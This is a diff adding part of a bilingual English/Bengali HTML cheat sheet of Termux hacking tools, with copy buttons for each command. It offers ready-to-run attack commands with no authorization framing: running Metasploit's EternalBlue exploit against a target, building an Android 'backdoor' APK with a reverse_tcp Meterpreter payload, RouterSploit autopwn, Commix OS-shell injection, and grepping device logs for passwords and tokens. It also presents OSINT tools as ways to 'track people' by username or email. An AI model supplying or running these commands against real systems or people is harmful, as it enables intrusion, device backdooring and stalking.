+          <span class="badge b-exploit">EXPLOIT</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Metasploit</div>
+          <div class="feat-title bn">✦ Metasploit দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">2000+ Exploits</span><span class="feat bn">২০০০+ এক্সপ্লয়েট</span>
+            <span class="feat en">Meterpreter Shell</span><span class="feat bn">মিটারপ্রেটার শেল</span>
+            <span class="feat en">APK Payload (msfvenom)</span><span class="feat bn">APK পেলোড তৈরি</span>
+            <span class="feat en">Post-Exploitation</span><span class="feat bn">পোস্ট-এক্সপ্লয়েটেশন</span>
+            <span class="feat en">Scanner Modules</span><span class="feat bn">স্ক্যানার মডিউল</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">unstable-repo</span> && <span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">metasploit-framework</span></code>
+          <button class="cpbtn" onclick="cp(this,'pkg install unstable-repo && pkg install metasploit-framework')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">msfconsole</span></div>
+            <div class="cmd-note en">Launch the Metasploit interactive console</div>
+            <div class="cmd-note bn">Metasploit ইন্টারেক্টিভ কনসোল চালু করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'msfconsole')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code">msf&gt; <span class="cb">search</span> <span class="ca">eternalblue</span></div>
+            <div class="cmd-note en">Search for specific exploit modules</div>
+            <div class="cmd-note bn">নির্দিষ্ট এক্সপ্লয়েট মডিউল সার্চ করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'search eternalblue')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code">msf&gt; <span class="cb">use</span> <span class="ca">exploit/windows/smb/ms17_010_eternalblue</span></div>
+            <div class="cmd-note en">Load a specific exploit module</div>
+            <div class="cmd-note bn">নির্দিষ্ট এক্সপ্লয়েট মডিউল লোড করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'use exploit/windows/smb/ms17_010_eternalblue')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code">msf&gt; <span class="cb">set RHOSTS</span> <span class="ca">192.168.1.5</span> && <span class="cb">set LHOST</span> <span class="ca">192.168.1.100</span> && <span class="cb">run</span></div>
+            <div class="cmd-note en">Set target (RHOSTS) & your IP (LHOST), then run</div>
+            <div class="cmd-note bn">টার্গেট (RHOSTS) ও আপনার IP (LHOST) সেট করে রান করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'set RHOSTS 192.168.1.5')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">msfvenom</span> <span class="cf">-p</span> android/meterpreter/reverse_tcp <span class="cf">LHOST=</span><span class="ca">YOUR_IP</span> <span class="cf">LPORT=</span><span class="ca">4444</span> <span class="cf">-o</span> app.apk</div>
+            <div class="cmd-note en">Generate Android backdoor APK payload</div>
+            <div class="cmd-note bn">Android ব্যাকডোর APK পেলোড তৈরি করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o app.apk')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- ROUTERSPLOIT -->
+      <div class="card" data-cat="exploit" data-kw="routersploit router iot exploit default creds">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#1a0010;border:1px solid #ff6688;">📡</div>
+          <div class="tool-meta">
+            <div class="tool-name">RouterSploit</div>
+            <div class="tool-desc en">Router & IoT device exploitation framework with 100+ exploits</div>
+            <div class="tool-desc bn">রাউটার ও IoT ডিভাইস এক্সপ্লয়েটেশন ফ্রেমওয়ার্ক ১০০+ এক্সপ্লয়েট</div>
+          </div>
+          <span class="badge b-exploit">EXPLOIT</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with RouterSploit</div>
+          <div class="feat-title bn">✦ RouterSploit দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Router Exploits</span><span class="feat bn">রাউটার এক্সপ্লয়েট</span>
+            <span class="feat en">Default Cred Check</span><span class="feat bn">ডিফল্ট ক্রেডেনশিয়াল চেক</span>
+            <span class="feat en">Auto Scanner</span><span class="feat bn">অটো স্ক্যানার</span>
+            <span class="feat en">CCTV/Camera Exploit</span><span class="feat bn">CCTV/ক্যামেরা এক্সপ্লয়েট</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code>git clone https://github.com/threat9/routersploit && cd routersploit && pip install -r requirements.txt</code>
+          <button class="cpbtn" onclick="cp(this,'git clone https://github.com/threat9/routersploit && cd routersploit && pip install -r requirements.txt')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">python3</span> rsf.py</div>
+            <div class="cmd-note en">Launch RouterSploit console</div>
+            <div class="cmd-note bn">RouterSploit কনসোল চালু করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'python3 rsf.py')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code">rsf&gt; <span class="cb">use scanners/autopwn</span></div>
+            <div class="cmd-note en">Load the autopwn scanner — auto-finds all router vulns</div>
+            <div class="cmd-note bn">অটোপন স্ক্যানার লোড করুন — রাউটারের সব vuln খুঁজে পাবে</div>
+          </div><button class="cpbtn" onclick="cp(this,'use scanners/autopwn')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code">rsf&gt; <span class="cb">set target</span> <span class="ca">192.168.1.1</span> && <span class="cb">run</span></div>
+            <div class="cmd-note en">Set router IP and scan for vulnerabilities</div>
+            <div class="cmd-note bn">রাউটার IP সেট করে ভালনারেবিলিটি স্ক্যান চালান</div>
+          </div><button class="cpbtn" onclick="cp(this,'set target 192.168.1.1')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- COMMIX -->
+      <div class="card" data-cat="exploit web" data-kw="commix command injection os shell web exploit">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#1a0010;border:1px solid #ff6688;">💥</div>
+          <div class="tool-meta">
+            <div class="tool-name">Commix</div>
+            <div class="tool-desc en">Automated OS command injection detection & exploitation</div>
+            <div class="tool-desc bn">অটোমেটেড OS কমান্ড ইনজেকশন ডিটেকশন ও এক্সপ্লয়েটেশন</div>
+          </div>
+          <span class="badge b-exploit">EXPLOIT</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Commix</div>
+          <div class="feat-title bn">✦ Commix দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Command Injection</span><span class="feat bn">কমান্ড ইনজেকশন</span>
+            <span class="feat en">Remote Shell</span><span class="feat bn">রিমোট শেল</span>
+            <span class="feat en">File Read/Write</span><span class="feat bn">ফাইল পড়া/লেখা</span>
+            <span class="feat en">Bypass Filters</span><span class="feat bn">ফিল্টার বাইপাস</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code>git clone https://github.com/commixproject/commix && cd commix && pip install -r requirements.txt</code>
+          <button class="cpbtn" onclick="cp(this,'git clone https://github.com/commixproject/commix && cd commix && pip install -r requirements.txt')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">python3</span> commix.py <span class="cf">--url=</span><span class="cs">"http://target.com/page?ip=INJECT_HERE"</span></div>
+            <div class="cmd-note en">Test URL parameter for OS command injection</div>
+            <div class="cmd-note bn">URL প্যারামিটারে OS কমান্ড ইনজেকশন টেস্ট করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'python3 commix.py --url=\"http://target.com/page?ip=INJECT_HERE\"')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">python3</span> commix.py <span class="cf">--url=</span><span class="cs">"url"</span> <span class="cf">--os-shell</span></div>
+            <div class="cmd-note en">Get interactive OS shell if injection succeeds</div>
+            <div class="cmd-note bn">ইনজেকশন সফল হলে ইন্টারেক্টিভ OS শেল পান</div>
+          </div><button class="cpbtn" onclick="cp(this,'python3 commix.py --url=\"url\" --os-shell')">COPY</button></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════════
+       6. OSINT TOOLS
+  ════════════════════════════════════════ -->
+  <div class="sec" data-section="osint">
+    <div class="sec-head">
+      <div class="sec-icon">🕵️</div>
+      <div>
+        <div class="sec-title en">OSINT Tools</div>
+        <div class="sec-title bn">OSINT টুলস</div>
+        <div class="sec-sub en">Open Source Intelligence — track people & accounts online</div>
+        <div class="sec-sub bn">ওপেন সোর্স ইন্টেলিজেন্স — মানুষ ও অ্যাকাউন্ট ট্র্যাক করুন</div>
+      </div>
+      <div class="sec-count">3 TOOLS</div>
+    </div>
+    <div class="grid">
+
+      <!-- MAIGRET -->
+      <div class="card" data-cat="osint" data-kw="maigret username 2500 sites account finder">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#100a1a;border:1px solid var(--purple);">🕵️</div>
+          <div class="tool-meta">
+            <div class="tool-name">Maigret</div>
+            <div class="tool-desc en">Collect person info by username — checks 2500+ sites</div>
+            <div class="tool-desc bn">ইউজারনেম দিয়ে ব্যক্তির তথ্য — ২৫০০+ সাইট চেক করে</div>
+          </div>
+          <span class="badge b-osint">OSINT</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Maigret</div>
+          <div class="feat-title bn">✦ Maigret দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">2500+ Sites Check</span><span class="feat bn">২৫০০+ সাইট চেক</span>
+            <span class="feat en">Detailed Profile Report</span><span class="feat bn">বিস্তারিত প্রোফাইল রিপোর্ট</span>
+            <span class="feat en">HTML/PDF Export</span><span class="feat bn">HTML/PDF এক্সপোর্ট</span>
+            <span class="feat en">Account Tags</span><span class="feat bn">অ্যাকাউন্ট ট্যাগ</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code>pip install maigret</code>
+          <button class="cpbtn" onclick="cp(this,'pip install maigret')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">maigret</span> <span class="ca">username</span></div>
+            <div class="cmd-note en">Find accounts across 2500+ sites with this username</div>
+            <div class="cmd-note bn">২৫০০+ সাইটে এই ইউজারনেমের অ্যাকাউন্ট খুঁজুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'maigret username')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">maigret</span> <span class="ca">username</span> <span class="cf">--html -P</span></div>
+            <div class="cmd-note en">Generate HTML report + show person profile</div>
+            <div class="cmd-note bn">HTML রিপোর্ট তৈরি করুন + পার্সন প্রোফাইল দেখান</div>
+          </div><button class="cpbtn" onclick="cp(this,'maigret username --html -P')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- HOLEHE -->
+      <div class="card" data-cat="osint" data-kw="holehe email account check registered 120 sites">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#100a1a;border:1px solid var(--purple);">📧</div>
+          <div class="tool-meta">
+            <div class="tool-name">Holehe</div>
+            <div class="tool-desc en">Check if email is registered on 120+ websites</div>
+            <div class="tool-desc bn">ইমেইল ১২০+ ওয়েবসাইটে রেজিস্টার্ড কিনা চেক করুন</div>
+          </div>
+          <span class="badge b-osint">OSINT</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Holehe</div>
+          <div class="feat-title bn">✦ Holehe দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Email Footprint</span><span class="feat bn">ইমেইল ফুটপ্রিন্ট</span>
+            <span class="feat en">120+ Platforms</span><span class="feat bn">১২০+ প্ল্যাটফর্ম</span>
+            <span class="feat en">Account Discovery</span><span class="feat bn">অ্যাকাউন্ট আবিষ্কার</span>
+            <span class="feat en">CSV Export</span><span class="feat bn">CSV এক্সপোর্ট</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code>pip install holehe</code>
+          <button class="cpbtn" onclick="cp(this,'pip install holehe')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">holehe</span> <span class="ca">target@email.com</span></div>
+            <div class="cmd-note en">Find all sites where this email is registered</div>
+            <div class="cmd-note bn">এই ইমেইল কোন কোন সাইটে রেজিস্টার্ড তা খুঁজুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'holehe target@email.com')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">holehe</span> <span class="ca">email@example.com</span> <span class="cf">--csv</span></div>
+            <div class="cmd-note en">Save results to CSV file</div>
+            <div class="cmd-note bn">রেজাল্ট CSV ফাইলে সেভ করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'holehe email@example.com --csv')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- SOCIAL-ANALYZER -->
+      <div class="card" data-cat="osint" data-kw="social analyzer username profile 1000 platforms">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#100a1a;border:1px solid var(--purple);">🔬</div>
+          <div class="tool-meta">
+            <div class="tool-name">Social-Analyzer</div>
+            <div class="tool-desc en">Find & analyze social profiles — 1000+ platforms with web UI</div>
+            <div class="tool-desc bn">সোশ্যাল প্রোফাইল খুঁজুন ও বিশ্লেষণ — ১০০০+ প্ল্যাটফর্ম + ওয়েব UI</div>
+          </div>
+          <span class="badge b-osint">OSINT</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Social-Analyzer</div>
+          <div class="feat-title bn">✦ Social-Analyzer দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">1000+ Platforms</span><span class="feat bn">১০০০+ প্ল্যাটফর্ম</span>
+            <span class="feat en">Profile Analysis</span><span class="feat bn">প্রোফাইল বিশ্লেষণ</span>
+            <span class="feat en">Web Dashboard</span><span class="feat bn">ওয়েব ড্যাশবোর্ড</span>
+            <span class="feat en">JSON/CSV Export</span><span class="feat bn">JSON/CSV এক্সপোর্ট</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code>pip install social-analyzer</code>
+          <button class="cpbtn" onclick="cp(this,'pip install social-analyzer')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">python3</span> -m social_analyzer <span class="cf">--username</span> <span class="cs">"johndoe"</span> <span class="cf">--mode</span> fast</div>
+            <div class="cmd-note en">Fast search for username across all platforms</div>
+            <div class="cmd-note bn">সব প্ল্যাটফর্মে দ্রুত ইউজারনেম সার্চ</div>
+          </div><button class="cpbtn" onclick="cp(this,'python3 -m social_analyzer --username \"johndoe\" --mode fast')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">python3</span> -m social_analyzer <span class="cf">--username</span> <span class="cs">"johndoe"</span> <span class="cf">--mode</span> deep <span class="cf">--output</span> json</div>
+            <div class="cmd-note en">Deep search with JSON output for full profile data</div>
+            <div class="cmd-note bn">JSON আউটপুটসহ ডিপ সার্চ — সম্পূর্ণ প্রোফাইল ডেটা</div>
+          </div><button class="cpbtn" onclick="cp(this,'python3 -m social_analyzer --username \"johndoe\" --mode deep --output json')">COPY</button></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════════
+       7. ANDROID / MOBILE TESTING
+  ════════════════════════════════════════ -->
+  <div class="sec" data-section="android">
+    <div class="sec-head">
+      <div class="sec-icon">📱</div>
+      <div>
+        <div class="sec-title en">Android / Mobile Testing</div>
+        <div class="sec-title bn">Android / মোবাইল টেস্টিং</div>
+        <div class="sec-sub en">Reverse engineer, analyze & test Android applications</div>
+        <div class="sec-sub bn">Android অ্যাপ্লিকেশন রিভার্স ইঞ্জিনিয়ার, বিশ্লেষণ ও টেস্ট করুন</div>
+      </div>
+      <div class="sec-count">3 TOOLS</div>
+    </div>
+    <div class="grid">
+
+      <!-- APKTOOL -->
+      <div class="card" data-cat="android" data-kw="apktool decompile apk android smali reverse">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#1a1500;border:1px solid var(--yellow);">🔧</div>
+          <div class="tool-meta">
+            <div class="tool-name">Apktool</div>
+            <div class="tool-desc en">Decompile & recompile Android APKs — read & modify apps</div>
+            <div class="tool-desc bn">Android APK ডিকম্পাইল ও রিকম্পাইল — অ্যাপ পড়ুন ও মডিফাই করুন</div>
+          </div>
+          <span class="badge b-android">ANDROID</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Apktool</div>
+          <div class="feat-title bn">✦ Apktool দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">APK Decompile</span><span class="feat bn">APK ডিকম্পাইল</span>
+            <span class="feat en">Smali Code View</span><span class="feat bn">Smali কোড দেখুন</span>
+            <span class="feat en">Manifest Analysis</span><span class="feat bn">Manifest বিশ্লেষণ</span>
+            <span class="feat en">Modify & Rebuild</span><span class="feat bn">মডিফাই ও রিবিল্ড</span>
+            <span class="feat en">Resource Extract</span><span class="feat bn">রিসোর্স এক্সট্র্যাক্ট</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">apktool</span></code>
+          <button class="cpbtn" onclick="cp(this,'pkg install apktool')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">apktool d</span> <span class="ca">app.apk</span> <span class="cf">-o</span> output_folder</div>
+            <div class="cmd-note en">Decompile APK to Smali code + resources + AndroidManifest.xml</div>
+            <div class="cmd-note bn">APK ডিকম্পাইল করুন — Smali কোড + রিসোর্স + Manifest</div>
+          </div><button class="cpbtn" onclick="cp(this,'apktool d app.apk -o output_folder')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">apktool b</span> <span class="ca">output_folder</span> <span class="cf">-o</span> new_app.apk</div>
+            <div class="cmd-note en">Rebuild modified folder back into APK file</div>
+            <div class="cmd-note bn">মডিফাই করা ফোল্ডার থেকে নতুন APK রিবিল্ড করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'apktool b output_folder -o new_app.apk')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">cat</span> output_folder/AndroidManifest.xml</div>
+            <div class="cmd-note en">Read app permissions & components from manifest</div>
+            <div class="cmd-note bn">Manifest থেকে অ্যাপ পারমিশন ও কম্পোনেন্ট পড়ুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'cat output_folder/AndroidManifest.xml')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- MOBSF -->
+      <div class="card" data-cat="android" data-kw="mobsf mobile security framework static analysis apk">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#1a1500;border:1px solid var(--yellow);">🔬</div>
+          <div class="tool-meta">
+            <div class="tool-name">MobSF</div>
+            <div class="tool-desc en">Mobile Security Framework — automated APK static & dynamic analysis</div>
+            <div class="tool-desc bn">মোবাইল সিকিউরিটি ফ্রেমওয়ার্ক — অটোমেটেড APK স্ট্যাটিক ও ডায়নামিক বিশ্লেষণ</div>
+          </div>
+          <span class="badge b-android">ANDROID</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with MobSF</div>
+          <div class="feat-title bn">✦ MobSF দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Static Analysis</span><span class="feat bn">স্ট্যাটিক বিশ্লেষণ</span>
+            <span class="feat en">Permission Analysis</span><span class="feat bn">পারমিশন বিশ্লেষণ</span>
+            <span class="feat en">Malware Detection</span><span class="feat bn">ম্যালওয়ার ডিটেকশন</span>
+            <span class="feat en">API Key Finder</span><span class="feat bn">API কী খোঁজা</span>
+            <span class="feat en">Hardcoded Secrets</span><span class="feat bn">হার্ডকোডেড সিক্রেট</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code>git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF && cd Mobile-Security-Framework-MobSF && pip install -r requirements.txt</code>
+          <button class="cpbtn" onclick="cp(this,'git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF && cd Mobile-Security-Framework-MobSF && pip install -r requirements.txt')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">python3</span> manage.py runserver <span class="ca">0.0.0.0:8000</span></div>
+            <div class="cmd-note en">Start MobSF web server → open http://localhost:8000 → upload APK</div>
+            <div class="cmd-note bn">MobSF সার্ভার চালু → http://localhost:8000 খুলুন → APK আপলোড করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'python3 manage.py runserver 0.0.0.0:8000')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- ADB TOOLS -->
+      <div class="card" data-cat="android" data-kw="adb android debug bridge device shell install">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#1a1500;border:1px solid var(--yellow);">🤖</div>
+          <div class="tool-meta">
+            <div class="tool-name">ADB Tools</div>
+            <div class="tool-desc en">Android Debug Bridge — control any Android device from terminal</div>
+            <div class="tool-desc bn">Android Debug Bridge — টার্মিনাল থেকে যেকোনো Android ডিভাইস নিয়ন্ত্রণ</div>
+          </div>
+          <span class="badge b-android">ANDROID</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with ADB</div>
+          <div class="feat-title bn">✦ ADB দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Device Shell Access</span><span class="feat bn">ডিভাইস শেল অ্যাক্সেস</span>
+            <span class="feat en">Install/Remove APK</span><span class="feat bn">APK ইন্সটল/রিমুভ</span>
+            <span class="feat en">File Push/Pull</span><span class="feat bn">ফাইল পুশ/পুল</span>
+            <span class="feat en">Logcat (App Logs)</span><span class="feat bn">লগক্যাট (অ্যাপ লগ)</span>
+            <span class="feat en">Screen Record</span><span class="feat bn">স্ক্রিন রেকর্ড</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">android-tools</span></code>
+          <button class="cpbtn" onclick="cp(this,'pkg install android-tools')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">adb</span> devices</div>
+            <div class="cmd-note en">List all connected Android devices</div>
+            <div class="cmd-note bn">সংযুক্ত সব Android ডিভাইস দেখুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'adb devices')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">adb</span> shell</div>
+            <div class="cmd-note en">Open interactive shell on connected device</div>
+            <div class="cmd-note bn">সংযুক্ত ডিভাইসে ইন্টারেক্টিভ শেল খুলুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'adb shell')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">adb</span> install <span class="ca">app.apk</span></div>
+            <div class="cmd-note en">Install APK on connected device</div>
+            <div class="cmd-note bn">সংযুক্ত ডিভাইসে APK ইন্সটল করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'adb install app.apk')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">adb</span> pull <span class="ca">/sdcard/</span> <span class="ca">./backup/</span></div>
+            <div class="cmd-note en">Pull all files from device SD card to PC</div>
+            <div class="cmd-note bn">ডিভাইস SD কার্ড থেকে সব ফাইল PC-তে টানুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'adb pull /sdcard/ ./backup/')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">adb</span> logcat | grep <span class="cs">"Error\|password\|token"</span></div>
+            <div class="cmd-note en">Monitor device logs and filter sensitive keywords</div>
+            <div class="cmd-note bn">ডিভাইস লগ মনিটর করুন — সেনসিটিভ কীওয়ার্ড ফিল্টার</div>
+          </div><button class="cpbtn" onclick="cp(this,'adb logcat | grep \"Error\\|password\\|token\"')">COPY</button></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════════
+       8. TERMUX UTILITY / AUTOMATION
+  ════════════════════════════════════════ -->
+  <div class="sec" data-section="util">
+    <div class="sec-head">
+      <div class="sec-icon">⚙️</div>
+      <div>
+        <div class="sec-title en">Termux Utility / Automation</div>
+        <div class="sec-title bn">Termux ইউটিলিটি / অটোমেশন</div>
+        <div class="sec-sub en">Tunneling, SSH, scripting languages & dev tools</div>
+        <div class="sec-sub bn">টানেলিং, SSH, স্ক্রিপ্টিং ভাষা ও ডেভ টুলস</div>
+      </div>
+      <div class="sec-count">5 TOOLS</div>
+    </div>
+    <div class="grid">
+
+      <!-- NGROK -->
+      <div class="card" data-cat="util" data-kw="ngrok tunnel expose localhost public url port forwarding">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#001a10;border:1px solid var(--green);">🌍</div>
+          <div class="tool-meta">
+            <div class="tool-name">Ngrok</div>
+            <div class="tool-desc en">Expose local server to internet instantly via secure tunnel</div>
+            <div class="tool-desc bn">লোকাল সার্ভার তাৎক্ষণিকভাবে ইন্টারনেটে এক্সপোজ করুন</div>
+          </div>
+          <span class="badge b-util">UTILITY</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Ngrok</div>
+          <div class="feat-title bn">✦ Ngrok দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">HTTP/HTTPS Tunnel</span><span class="feat bn">HTTP/HTTPS টানেল</span>
+            <span class="feat en">TCP Tunnel</span><span class="feat bn">TCP টানেল</span>
+            <span class="feat en">Public URL</span><span class="feat bn">পাবলিক URL</span>
+            <span class="feat en">Webhook Testing</span><span class="feat bn">Webhook টেস্টিং</span>
+            <span class="feat en">Request Inspector</span><span class="feat bn">রিকোয়েস্ট ইন্সপেক্টর</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code>pkg install wget && wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz && tar xzf ngrok*.tgz && chmod +x ngrok</code>
+          <button class="cpbtn" onclick="cp(this,'pkg install wget && wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz && tar xzf ngrok*.tgz && chmod +x ngrok')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">./ngrok</span> authtoken <span class="ca">YOUR_TOKEN</span></div>
+            <div class="cmd-note en">Authenticate ngrok (get token from ngrok.com account)</div>
+            <div class="cmd-note bn">Ngrok অথেন্টিকেট করুন (ngrok.com থেকে টোকেন নিন)</div>
+          </div><button class="cpbtn" onclick="cp(this,'./ngrok authtoken YOUR_TOKEN')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">./ngrok</span> http <span class="ca">8080</span></div>
+            <div class="cmd-note en">Create public HTTPS tunnel to local port 8080</div>
+            <div class="cmd-note bn">লোকাল পোর্ট 8080-এ পাবলিক HTTPS টানেল তৈরি করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'./ngrok http 8080')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">./ngrok</span> tcp <span class="ca">22</span></div>
+            <div class="cmd-note en">Expose SSH port to internet (for remote access)</div>
+            <div class="cmd-note bn">SSH পোর্ট ইন্টারনেটে এক্সপোজ করুন (রিমোট অ্যাক্সেসের জন্য)</div>
+          </div><button class="cpbtn" onclick="cp(this,'./ngrok tcp 22')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- CLOUDFLARED -->
+      <div class="card" data-cat="util" data-kw="cloudflared cloudflare tunnel free https no port">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#001a10;border:1px solid var(--green);">☁️</div>
+          <div class="tool-meta">
+            <div class="tool-name">Cloudflared</div>
+            <div class="tool-desc en">Free Cloudflare tunnel — no account needed, instant HTTPS URL</div>
+            <div class="tool-desc bn">ফ্রি Cloudflare টানেল — অ্যাকাউন্ট লাগে না, তাৎক্ষণিক HTTPS URL</div>
+          </div>
+          <span class="badge b-util">UTILITY</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Cloudflared</div>
+          <div class="feat-title bn">✦ Cloudflared দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Free HTTPS Tunnel</span><span class="feat bn">ফ্রি HTTPS টানেল</span>
+            <span class="feat en">No Port Forwarding</span><span class="feat bn">পোর্ট ফরওয়ার্ড লাগে না</span>
